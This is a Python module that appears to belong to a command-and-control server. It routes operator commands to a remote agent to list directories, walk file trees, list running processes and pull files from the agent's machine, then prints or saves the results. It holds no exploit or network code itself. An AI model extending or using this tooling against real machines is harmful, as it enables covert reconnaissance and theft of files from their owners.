from protocol.common import *
import os


#  c2 command definitions will appear here.


################################################
# agent command responses
################################################


def handle_command_response(command_id, command_status, command_response):
    if command_status != MESSAGE_STATUS_OK:
        raise Exception(f"[-] Received status {command_status} for command {command_id} from agent.\n"
                        f"Command response received was:\n\t{command_response.decode()}")

    if command_id not in c2_command_id_to_response_handler:
        raise TypeError(f"[-] No response handler found for command id {command_id}")

    print(f"[+] Finished receiving payload for command {command_id}")
    payload_handler = c2_command_id_to_response_handler[command_id]
    payload_handler(command_id, command_response)


def print_response(command_id, payload):
    print(f"[+] Response for command {command_id}:\n\n{payload.decode()}\n")


def save_uploaded_file(command_id, file):
    print(f"[+] Saving uploaded file '{file.file_name}' to: '{file.default_file_save_folder}'\n")
    file.save()


# functions to handle the command response from agent
c2_command_id_to_response_handler = {
    LISTDIR_COMMAND_ID: print_response,
    WALKDIR_COMMAND_ID: print_response,
    RUNNING_PROCESSES_COMMAND_ID: print_response,
    FILE_UPLOAD_COMMAND_ID: save_uploaded_file,
}


################################################
# UI command requests
################################################


def handle_command_request(command_id):
    if command_id not in c2_command_id_to_request_handler:
        raise Exception(f"[-] No request handler found for command id {command_id}")

    c2_command_handler = c2_command_id_to_request_handler[command_id]
    return c2_command_handler()


def no_arguments_required():
    return ""


def get_path():
    path = input("Enter requested absolute path on agent file system:\n")
    if not os.path.isabs(path):
        raise ValueError(f"[-] {path} isn't a valid absolute path. Try again")

    return path


# functions to handle the command request from UI
# if any additional arguments needed from the user while sending the command from c2 to agent, they will be collected here
# remember to validate the user inputs based on the command !
c2_command_id_to_request_handler = {
    LISTDIR_COMMAND_ID: get_path,
    WALKDIR_COMMAND_ID: get_path,
    RUNNING_PROCESSES_COMMAND_ID: no_arguments_required,
    FILE_UPLOAD_COMMAND_ID: get_path,
}



